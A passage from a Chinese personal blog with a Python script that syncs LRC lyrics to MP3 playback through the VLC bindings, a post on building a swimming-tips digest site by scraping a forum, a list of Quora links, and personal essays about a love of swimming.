<p>完整覆盖libvlc功能，纯python，支持各个vlc版本和完整的文档。[^2]</p>
<p>但开始我以为pip可以直接下载……后来发现pip搜索到的是macos独有的vlc python wrapper……和这个绑定是两码事……真给跪了……</p>
<p>自行下载<a href="http://git.videolan.org/?p=vlc/bindings/python.git;a=tree;f=generated;b=HEAD" target="_blank" rel="external">vlc.py</a>到当前目录或者扔到python搜索路径。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> vlc</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f_mp3 = sys.argv[<span class="number">1</span>]</span><br><span class="line">f_lrc = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lrc2dict</span><span class="params">(lrc)</span>:</span></span><br><span class="line">    lrc_dict = &#123;&#125;</span><br><span class="line">    remove = <span class="keyword">lambda</span> x: x.strip(<span class="string">'[|]'</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lrc.split(<span class="string">'\n'</span>):</span><br><span class="line">        time_stamps = re.findall(<span class="string">r'\[[^\]]+\]'</span>, line)</span><br><span class="line">        <span class="keyword">if</span> time_stamps:</span><br><span class="line">            <span class="comment"># 截取歌词</span></span><br><span class="line">            lyric = line</span><br><span class="line">            <span class="keyword">for</span> tplus <span class="keyword">in</span> time_stamps:</span><br><span class="line">                lyric = lyric.replace(tplus, <span class="string">''</span>)</span><br><span class="line">            <span class="comment"># 解析时间</span></span><br><span class="line">            <span class="comment"># tplus: [02:31.79]</span></span><br><span class="line">            <span class="comment"># t 02:31.79</span></span><br><span class="line">            <span class="keyword">for</span> tplus <span class="keyword">in</span> time_stamps:</span><br><span class="line">                t = remove(tplus)</span><br><span class="line">                tag_flag = t.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="comment"># 跳过: [ar: 逃跑计划]</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> tag_flag.isdigit():</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                time_lrc = int(tag_flag) * <span class="number">60000</span></span><br><span class="line">                time_lrc += int(t.split(<span class="string">':'</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]) * <span class="number">1000</span></span><br><span class="line">                <span class="comment"># ms也许没有</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    time_lrc += int(t.split(<span class="string">'.'</span>)[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="comment"># 截取到0.1s精度,降低cpu占用</span></span><br><span class="line">                time_lrc = time_lrc / <span class="number">1000</span> * <span class="number">1000</span></span><br><span class="line">                lrc_dict[time_lrc] = lyric</span><br><span class="line">    <span class="keyword">return</span> lrc_dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_lrc</span><span class="params">(player, lrc_d, color)</span>:</span></span><br><span class="line">    player.play()</span><br><span class="line">    player.pause()</span><br><span class="line">    <span class="comment"># 防止无法获取整个音频时长</span></span><br><span class="line">    <span class="comment"># 音频时长必须加载才能读取</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    player.play()</span><br><span class="line">    wholetime = mediaObject.get_duration() / <span class="number">1000</span> * <span class="number">1000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 截取到0.1s精度,降低cpu占用, notwork fine for vlc</span></span><br><span class="line">        <span class="comment"># <span class="doctag">FIXME:</span> get_time NOT WORK WELL, 只能精确到0.3s</span></span><br><span class="line">        <span class="comment"># t = player.get_position() * wholetime</span></span><br><span class="line">        t = player.get_time() / <span class="number">1000</span> * <span class="number">1000</span></span><br><span class="line">        <span class="comment"># sys.stdout.write(str(t) + '\r')</span></span><br><span class="line">        sys.stdout.write(<span class="string">'['</span> +</span><br><span class="line">                         time.strftime(<span class="string">"%M:%S"</span>, time.localtime(t / <span class="number">1000</span>)) +</span><br><span class="line">                         <span class="string">'/'</span> +</span><br><span class="line">                         time.strftime(<span class="string">"%M:%S"</span>,</span><br><span class="line">                                       time.localtime(wholetime / <span class="number">1000</span>)) +</span><br><span class="line">                         <span class="string">'] '</span>)</span><br><span class="line">        <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> lrc_d:</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="comment"># 向后清除</span></span><br><span class="line">            <span class="comment"># sys.stdout.write("\033[K")</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stdout.write(color + lrc_d[t] + <span class="string">'\033[0m'</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="comment"># 向后清除</span></span><br><span class="line">            sys.stdout.write(<span class="string">"\033[K"</span>)</span><br><span class="line">        sys.stdout.write(<span class="string">'\r'</span>)</span><br><span class="line">        <span class="comment"># 播放停止时退出</span></span><br><span class="line">        <span class="keyword">if</span> t == wholetime:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 0.05s循环</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(f_lrc) <span class="keyword">as</span> f:</span><br><span class="line">    lrc = f.read()</span><br><span class="line"></span><br><span class="line">lrc_d = lrc2dict(lrc)</span><br><span class="line"></span><br><span class="line">vlcInstance = vlc.Instance()</span><br><span class="line">player = vlcInstance.media_player_new()</span><br><span class="line">mediaObject = vlcInstance.media_new(f_mp3)</span><br><span class="line">player.set_media(mediaObject)</span><br><span class="line"></span><br><span class="line">colors = [</span><br><span class="line">    <span class="string">'\x1B[31m'</span>,  <span class="comment"># 红色</span></span><br><span class="line">    <span class="string">'\x1B[32m'</span>,  <span class="comment"># 绿色</span></span><br><span class="line">    <span class="string">'\x1B[33m'</span>,  <span class="comment"># 黄色</span></span><br><span class="line">    <span class="string">'\x1B[34m'</span>,  <span class="comment"># 蓝色</span></span><br><span class="line">    <span class="string">'\x1B[35m'</span>,  <span class="comment"># 紫色</span></span><br><span class="line">    <span class="string">'\x1B[36m'</span>,  <span class="comment"># 青色</span></span><br><span class="line">    <span class="string">'\x1B[37m'</span>  <span class="comment"># 灰白</span></span><br><span class="line">]</span><br><span class="line">color = random.choice(colors)</span><br><span class="line">print_lrc(player, lrc_d, color)</span><br></pre></td></tr></table></figure>
<p>奇葩的还是那个丧心病狂的循环，查询播放进度最短间隔只有0.3s。只好把lrc歌词显示精度降到1s了</p>
<p>反正对我是能用了。</p>
<p>也许有空可以让它支持播放列表的，用vlc完全不是问题。</p>
<p>嗯，完工。我擦嘞我竟然一天写了俩！</p>
<h2 id="FootNotes">FootNotes</h2><p>[^1]: <a href="http://stackoverflow.com/questions/6936393/find-the-length-of-a-song-with-pygame" target="_blank" rel="external">Find the Length of a Song with Pygame</a><br>[^2]: <a href="https://wiki.videolan.org/Python_bindings" target="_blank" rel="external">Python bindings</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2014/10/09/" itemprop="url">
                  游泳日报
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-10-09T00:00:00+08:00" content="2014-10-09">
              2014-10-09
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2014/10/09/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2014/10/09//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="一起学游泳吧">一起学游泳吧</h2><p><code>点我----&gt;</code><a href="http://swim.reverland.org" target="_blank" rel="external">游泳日报</a><code>&lt;-----点我！</code></p>
<p>满满的热爱之心。</p>
<h2 id="缘起">缘起</h2><p>作为一个游泳的狂热爱好者。狂热到恨不得每天都泡在水里。</p>
<p>被诊断为支气管炎的时候</p>
<p>双腿因为爬山废掉路都快走不动的时候</p>
<p>天降暴雨电闪雷鸣马路成海的时候</p>
<p>都义无反顾地冲去泳池</p>
<p>泡在水里……</p>
<p>这样自由随性的游了一年。</p>
<p>后来，</p>
<p>和一群游起来非常优雅漂亮的半职业运动员们一起游了几次</p>
<p>或者十几次</p>
<p>抑或几十次，之后</p>
<p>我觉得得好好学习下。</p>
<p>于是通过伟大的互联网，</p>
<p>在<a href="http://topswim.net/" target="_blank" rel="external">游泳梦工厂</a>找到了很多</p>
<p>很多泳痴留下的武林秘笈。</p>
<p>欣喜异常！</p>
<p>但我觉得论坛上不好看……</p>
<p>于是诞生了把论坛上的帖子爬下来美化给自己看的愿望。</p>
<p>于是写了个爬虫……</p>
<p>后来，又想生成pdf，于是又折腾了下html转pdf。</p>
<p>后来，那阵经常刷知乎日报……于是又萌生了</p>
<p>制作<code>游泳日报</code>的想法。</p>
<p>最终写了一堆 <em>脚本</em> 来行使爬虫和静态页面生成的功能及其它辅助功能。</p>
<p>源码见<a href="https://github.com/reverland/topswim" target="_blank" rel="external">https://github.com/reverland/topswim</a></p>
<p>静态页面见<a href="https://github.com/reverland/topswim/tree/gh-pages" target="_blank" rel="external">https://github.com/reverland/topswim/tree/gh-pages</a></p>
<h2 id="具体实现">具体实现</h2><h3 id="爬虫部分">爬虫部分</h3><p>不是啥优雅的方法。</p>
<p>使用<code>lxml</code>和<code>requests</code>，把论坛页面的内容抓下来然后加上自定的内容。自己定义css文件。</p>
<h3 id="静态页面生成部分">静态页面生成部分</h3><p>首先是具体内容页面。根据爬取的内容，加上自定义的html内容。可能用jinja2啊什么模板什么的应该更优雅些，我这就以一种quick和dirty的脚本方式实现。</p>
<p>其次是首页生成方式。读取<code>rebuild.sh</code>文件取最新的六条生成首页。</p>
<p>最后是总目录页的生成。读取<code>rebuild.sh</code>内容获取所有内容。</p>
<h3 id="辅助构建部分">辅助构建部分</h3><p><code>update.sh</code>是主更新脚本。</p>
<p><code>update_index.py</code>和<code>update_toc.py</code>分别更新首页和总目录页。</p>
<p><code>rebuild.sh</code>负责重新构建所有内容页面。</p>
<h3 id="生成pdf部分">生成pdf部分</h3><p>使用<code>weasyprint</code>模块。</p>
<p>将视频替换为对应地址。</p>
<p>ps:开始使用<code>xhtml2pdf</code>模块，这东西支持中文字体要改，最关键的是中文不换行！！！即使最后按网上找来的设置什么wordwrap为cjk还是不换行。总之不推荐。</p>
<h2 id="其它">其它</h2><p>很多似乎需要优化的地方。</p>
<ol>
<li>把html文本和程序分离出来比较合适。</li>
<li>命令行参数处理用argparse啥的处理应该更加优雅</li>
<li>原谅我渣一样的前端水平。</li>
</ol>
<p>好吧，本渣只是一个script kid……</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/09/21/quora/" itemprop="url">
                  quora问答收藏
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-09-21T00:00:00+08:00" content="2014-09-21">
              2014-09-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/09/21/quora/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/09/21/quora/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>在学二十九下抬头仰望，天上的流云飘过不止，时光在飘过不止。</p>
<p>我看了会儿，脖子疼了。</p>
<h2 id="Quora">Quora</h2><p>quora是个不错的地方，满满的鸡汤和正能量。一下是一些喜欢的问答收藏</p>
<ul>
<li><a href="http://qr.ae/eXwBK" target="_blank" rel="external">How do you get over the fear of quitting your job to start a startup?</a></li>
</ul>
<p>我非常喜欢里头一句话：</p>
<blockquote>
<p>You don’t get over the fear. You run towards it, with your knees buckling.</p>
</blockquote>
<p>非常喜欢这句话，就像跳水一样，在自己迟疑胆怯之前跳出去，然后呢，该来的来该发生的发生，想什么都没什么用了= =</p>
<ul>
<li><a href="http://qr.ae/eXiMN" target="_blank" rel="external">For a 25 year old who has a lot of interests, and lack of direction in life. How does one pick a happy and fulfilling career?</a></li>
</ul>
<p>你的人生不只一次！</p>
<p>你能想像我看到这个图有多激动么？想到今后的日子似乎都定型了，就觉得糟糕透顶。</p>
<blockquote>
<p>but you have many times.</p>
</blockquote>
<ul>
<li><p><a href="">How should I go about making a hard life decision?</a></p>
</li>
<li><p><a href="http://www.quora.com/Has-your-life-matched-what-you-had-anticipated-in-your-mid-to-late-teens" target="_blank" rel="external">Has your life matched what you had anticipated in your mid to late teens?</a></p>
</li>
</ul>
<p>人生无常。</p>
<p>生活像一盒巧克力。</p>
<ul>
<li><a href="http://www.quora.com/How-do-you-deal-with-the-fear-of-dying" target="_blank" rel="external">How do you deal with the fear of dying?</a></li>
</ul>
<p>珍惜现在。</p>
<ul>
<li><a href="http://www.quora.com/What-did-people-learn-in-their-20s" target="_blank" rel="external">What did people learn in their 20s?</a></li>
</ul>
<p>很有意思的讨论。</p>
<ul>
<li><a href="http://www.quora.com/What-are-the-skills-that-are-most-important-to-learn-during-your-20s" target="_blank" rel="external">What are the skills that are most important to learn during your 20s?</a></li>
</ul>
<p>锻炼身体，养成健康生活方式。</p>
<blockquote>
<p>life is not one-size-fits-all.</p>
</blockquote>
<ul>
<li><p><a href="http://www.quora.com/What-are-good-ways-to-handle-rejection-in-life" target="_blank" rel="external">What are good ways to handle rejection in life?</a></p>
</li>
<li><p><a href="http://www.quora.com/What-is-the-point-of-life-Why-do-people-work-so-hard-in-life-even-though-they-know-that-nothing-they-have-done-or-ever-will-do-will-remain-with-them" target="_blank" rel="external">What is the point of life? Why do people work so hard in life even though they know that nothing they have done or ever will do will remain with them?</a></p>
</li>
<li><p><a href="http://www.quora.com/Why-work-on-long-term-goals-if-you-might-die-tomorrow" target="_blank" rel="external">Why work on long term goals if you might die tomorrow?</a></p>
</li>
<li><p><a href="http://www.quora.com/How-should-I-go-about-making-a-hard-life-decision" target="_blank" rel="external">How should I go about making a hard life decision?</a></p>
</li>
<li><p><a href="http://www.quora.com/What-are-the-top-10-things-that-we-should-be-informed-about-in-life" target="_blank" rel="external">What are the top 10 things that we should be informed about in life?</a></p>
</li>
<li><p><a href="http://www.quora.com/Meeting-New-People/What-is-the-best-way-to-start-an-engaging-conversation-with-a-stranger" target="_blank" rel="external">Meeting New People: What is the best way to start an engaging conversation with a stranger?</a></p>
</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/09/08/escape-plan/" itemprop="url">
                  Escape Plan
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-09-08T00:00:00+08:00" content="2014-09-08">
              2014-09-08
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/09/08/escape-plan/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/09/08/escape-plan/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="也许只是计划">也许只是计划</h2><blockquote>
<p>这是一个不完美的世界，我们无法选择。<br>面对丑恶，面对创伤，面对死亡，事实上我们无路可逃。<br>所以逃跑的真正意义仅存在于<strong>计划</strong>。<br>我们能做出的反应大多只能是慌乱，<br>但也有例外，就是一些根本逃不掉的东西-<strong>热爱</strong>。<br>这是一个不完美的世界，我们无法选择。面对丑恶，面对创伤，面对痛苦，事实上我们无路可逃。 </p>
<p>——逃跑计划</p>
</blockquote>
<p>我在想，今天在想，昨天在想，一周前在想，一个月前在想，一年前在想。</p>
<p>离开实验室，</p>
<p>干什么呢？</p>
<p>像疯子一样追寻、奔跑、欢笑。</p>
<p>锻炼身体，跑各种地方、游各种泳、打各种球。</p>
<p>弹吉他、唱歌、背诵喜欢的诗句。</p>
<p>画画，徒步，摄下瑰丽的风云。</p>
<p>做梦、发呆、看日出和启明星。</p>
<p>躺在树荫下的长椅，</p>
<p>投过斑斑驳驳的绿色心情</p>
<p>遥不可即的一朵蓝化作金色阳光中的白日梦</p>
<p>梦里的世界都是彩色的。</p>
<p>就像北师金秋灿烂的银杏叶，</p>
<p>火一样燃烧着</p>
<p>只有一次的人生，</p>
<p>跳动着五颜六色的火焰</p>
<p>梦里的游荡都是自由的</p>
<p>就像高远晴空的浩瀚</p>
<p>风一样穿行着</p>
<p>只有一霎的记忆</p>
<p>回味出五味杂陈的心酸</p>
<h2 id="关于畏惧">关于畏惧</h2><blockquote>
<p>You don’t get over the fear. You run towards it, with your knees buckling.</p>
<p>Feel the fear and do it anyway!</p>
<p>–<a href="http://www.quora.com/How-do-you-get-over-the-fear-of-quitting-your-job-to-start-a-startup" target="_blank" rel="external">Quora：你如何克服恐惧离开工作开始创业</a></p>
</blockquote>
<p>想说的话太多</p>
<p>想谁的觉太困</p>
<p>就这么一句，</p>
<p>老子不怕。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/08/26/" itemprop="url">
                  希望
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-26T00:00:00+08:00" content="2014-08-26">
              2014-08-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/08/26/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/08/26//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>“I am looking at the future with concern, but with good hope.”</p>
<p>Albert Schweitzer</p>
</blockquote>
<p>希望就像北京夏日的晚风，感受到，却无法捕捉，就像萦绕在空气中的思绪。</p>
<p>我数了数，就要感冒第九天了吧。</p>
<h2 id="I">I</h2><p>下午从寝室睡醒，迷迷糊糊地爬起来去实验室。</p>
<p>走在路上，阳光好炽烈，炽烈得好像世界马上就要融化了，灰飞烟灭，不复存在。</p>
<p>抬头看着科研楼的玻璃幕墙映出下午的蓝天白云，恍恍惚惚就像梦境一样。</p>
<p>就这么如行尸走肉般走进实验室了。</p>
<p>实验室总管大人坐在我的位置背后，看到我出现后问，你这是间歇性上班么。</p>
<p>嗯。</p>
<p>我没有看她，喝了一口水，坐下来，继续搬砖。</p>
<p>完全不想理人。</p>
<p>完全在想另外一些事：</p>
<p>明天，还下不了水么。</p>
<h2 id="II">II</h2><p>清晨，对面窗户的反光直愣愣地射到床上。</p>
<p>我睁开眼看了看，映入脑海的第一个消息是个坏消息：</p>
<p>还感冒着。</p>
<p>时间总是过得飞快，不管你喜欢它还是不愿接受，世界还是会毫不留情地从你的挽留前碾压过去。</p>
<p>上班时迷迷糊糊，走到面前才看到是组长大人。</p>
<p>进了电梯，她提起周末组内活动的事。</p>
<p>我说，晚上吃饭，我就下午去游泳。</p>
<p>她说，你不跟我们一起桌游了么，游泳换个时间游。</p>
<p>不，能游泳的日子一分都不想放过。</p>
<p>她没再说什么，似乎不高兴的样子，或者是我有些愧疚。</p>
<p>然而也没心情管这些，她应该明白我是什么样的人。</p>
<p>明天能下水吗？</p>
<h2 id="III">III</h2><p>我就是个疯子。</p>
<p>从来没掩饰过自己是多么看重游泳这件事。</p>
<p>我说过，头可断，血可流，泳不能不游。</p>
<p>我说，我来帝都，就有一个目的，能在学校里以低成本游泳。仅此一条就够了，我不在乎上什么学、毕什么业、将来找它什么工作。</p>
<p>所以，凡是阻碍游泳的都是敌人，凡是一起游泳的都是朋友。</p>
<p>游泳时碰到个信安的将毕业师兄，说到想休学一年或者退学旅行，我说我也想退学或者休学啊，想了都不是一次两次了。师兄问我，你退学干嘛？我不知道干啥，我只知道我有一大堆想干的但没法尽说，只知道一件事是肯定的，我要留在这里游泳！</p>
<p>游泳时才仿佛找到了自己，跳出了狭小而熟悉的圈子，拥抱更丰富多彩的世界。</p>
<p>暑假的一周假期，过得恍恍惚惚，莫名奇妙地就结束了。</p>
<p>几乎是从家里逃回了学校，原因之一就是无法忍受，不能下水的日子。</p>
<p>回校那天下午刚到，晚上就迫不及待游泳去了。</p>
<p>喂，就是这样。</p>
<p>大概如果，某天实验室要求我去哪个没法游泳的地方，即使再好，</p>
<p>大概我会决绝地拒绝过去。</p>
<p>大概有人如果跟我讲游泳怎么怎么不好或者想歪了的都会有种与之友尽的冲动。</p>
<p>其实现在已经在想工作之后的事。</p>
<p>从来只看眼前不看将来的我竟然在游泳这件事上能往后想十年。</p>
<p>然而回校没几天，就从师姐那里知悉了个悲剧。</p>
<p>学校的游泳馆整修关门，不知道什么时候开门。</p>
<h1 id="IV">IV</h1><p>不管怎样，泳是一定要游的。</p>
<p>拿出社工的技术把周遭所有游泳馆的信息几乎检查一遍。</p>
<p>北师、北交、北航、首体、水立方、人大、北外、英东……</p>
<p>去了北师几趟，1.4米的深水差点摔蒙。</p>
<p>差点去遍游北京各大高校……</p>
<p>后来怎么回事一起去了次人大，大家就选择人大了。</p>
<p>于是有了现在的“每晚攻占人大小分队”，我却掉队了……</p>
<p>那是和ZQ攻占人大后的当晚，嗓子疼得难以入眠，爬起来跑到阳台上</p>
<p>看着远处电光雷影，却听不到一点雷声。</p>
<p>然后就感冒了。那是周日晚</p>
<p>周一和父亲打电话，父亲问我还游泳么。我说，哦，如果明天没啥事就去。父亲说，还是等好了再去吧。</p>
<p>周二，我知道四天内是没指望了。晚上碰到DD，问周末要不要一起去。我真希望，而且以为周末感冒会好。</p>
<p>周三，请了一天假在寝室郁闷。希望周五就能下水了。</p>
<p>周四，呵呵了，希望周五感冒就好了。</p>
<p>周五，妹的，希望周六能下水。</p>
<p>周六，跟AS从西土城徒步到奥园，晚上洗澡时感觉随时都要倒下。我知道周日下水的美梦破灭了。</p>
<p>周日，DD还惦念着送了我一大袋子梨，我以为她就说说……然后我还厚颜无耻地收下了……额……心里太温暖了。晚上去北理和本科室友扯淡……直觉周一能下水的希望又破灭了。</p>
<p>周一，唉……但愿明天感冒好了</p>
<p>周二，花擦。</p>
<h2 id="V">V</h2><p>不管怎样，有得必有失，有失必有得。</p>
<p>结果是，准备弹一学期的歌可能用不了一学期了。</p>
<p>终于知道学校的洗澡堂是什么样的了。</p>
<p>我在想，我这个疯子，很多事该放弃了。毕竟，Don’t take the world upon your shoulders.</p>
<p>该想想怎么爱他人，就像他人对我的爱一样。</p>
<p>来帝都那天，收到妹妹的祝福短信。你们生日我都没记住过T T，连父母都不知道该送什么礼物好，你们难过伤心的时候我也无能为力地在暗处看着，听着，却不知道该做什么说什么。我只想远远得逃开，反正留着也没用。</p>
<p>人情是温暖的，也是沉重的。有这么些时候，就想默默地淡去。</p>
<p>但不想终其一生都是在逃避，无论是碧水中、网络上、琴弦里、还是色彩变换的光影里。</p>
<p>终究要面对，所有害怕的、不愿接受的、不喜欢的，该来的早晚来。</p>
<p>但我还想在水里逍遥一会儿。</p>
<h2 id="VI">VI</h2><p>虽然以上都是瞎扯的，但为了保证身体健康和心理健康，不知道明天能不能下水……估计得后天了，唉……</p>
<blockquote>
<p>Hey Jude, Don’t be afraid.</p>
<p>You are made to, go out and get her.</p>
<p>The minute you let it under your skins.</p>
<p>Then you begin to make it better.</p>
<p>Any time you feel the pain.</p>
<p>Hey Jude, refrain.</p>
<p>Don’t carry the world upon your shoulders.</p>
</blockquote>
<p>Na-nananananananannanananananananananananananannanananananananana</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/uncategorized/2014/08/14/fbi-tor-malware-analysis/" itemprop="url">
                  FBI Tor Malware analysis(意译整理)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-14T00:00:00+08:00" content="2014-08-14">
              2014-08-14
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/uncategorized/2014/08/14/fbi-tor-malware-analysis/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="uncategorized/2014/08/14/fbi-tor-malware-analysis/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>感想：</p>
